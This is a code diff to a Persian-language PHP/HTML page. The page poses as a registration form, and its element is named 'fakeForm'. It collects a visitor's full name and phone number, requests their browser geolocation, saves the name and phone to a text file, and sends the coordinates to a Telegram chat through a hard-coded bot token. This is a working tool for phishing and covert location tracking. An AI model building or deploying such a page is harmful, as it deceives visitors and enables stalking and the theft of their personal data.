@@ -2,6 +2,7 @@
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $data = json_decode(file_get_contents("php://input"), true);
 
+    // بررسی اطلاعات دریافتی برای موقعیت مکانی
     if (!isset($data["latitude"]) || !isset($data["longitude"])) {
         echo json_encode(["status" => "error", "message" => "Invalid input"]);
         exit;
@@ -10,9 +11,19 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $lat = $data["latitude"];
     $lon = $data["longitude"];
 
+    // ذخیره اطلاعات ثبت‌نامی در فایل txt
+    if (isset($data["fullname"]) && isset($data["phone"])) {
+        $file = fopen("user_data.txt", "a");
+        $txt = "نام و نام خانوادگی: " . $data["fullname"] . "\n";
+        $txt .= "شماره همراه: " . $data["phone"] . "\n";
+        $txt .= "---------------------------\n";
+        fwrite($file, $txt);
+        fclose($file);
+    }
+
+    // ارسال لوکیشن به تلگرام
     $token = "7926937226:AAFcIfZulEjhnXx7gQpnm712eE1-LvKoT_o";
     $chat_id = "-1002570608346";
-
     $url = "https://api.telegram.org/bot$token/sendLocation?" . http_build_query([
         "chat_id" => $chat_id,
         "latitude" => $lat,
@@ -56,9 +67,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
       color: #333;
     }
 
-    input[type="text"],
-    input[type="email"],
-    input[type="password"] {
+    input[type="text"], input[type="phone"] {
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
@@ -93,4 +102,56 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 <body>
   <div class="form-container">
     <h2>فرم ثبت اطلاعات</h2>
-    <form id="
+    <form id="fakeForm">
+      <input type="text" id="fullname" placeholder="نام کامل" required>
+      <input type="text" id="phone" placeholder="شماره همراه" required>
+      <button type="submit">ثبت اطلاعات</button>
+    </form>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    document.getElementById("fakeForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const statusEl = document.getElementById("status");
+      statusEl.innerText = "در حال ثبت...";
+
+      const fullname = document.getElementById("fullname").value;
+      const phone = document.getElementById("phone").value;
+
+      if (!navigator.geolocation) {
+        statusEl.innerText = "مرورگر موقعیت مکانی را پشتیبانی نمی‌کند.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(position => {
+        fetch("", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            fullname: fullname,
+            phone: phone,
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          })
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.status === "ok") {
+            statusEl.innerText = "اطلاعات با موفقیت ثبت شد!";
+          } else {
+            statusEl.innerText = "خطا در ثبت اطلاعات.";
+          }
+        })
+        .catch(() => {
+          statusEl.innerText = "خطا در ارتباط با سرور.";
+        });
+      }, () => {
+        statusEl.innerText = "اجازه دسترسی به موقعیت مکانی داده نشد.";
+      });
+    });
+  </script>
+</body>
+</html>
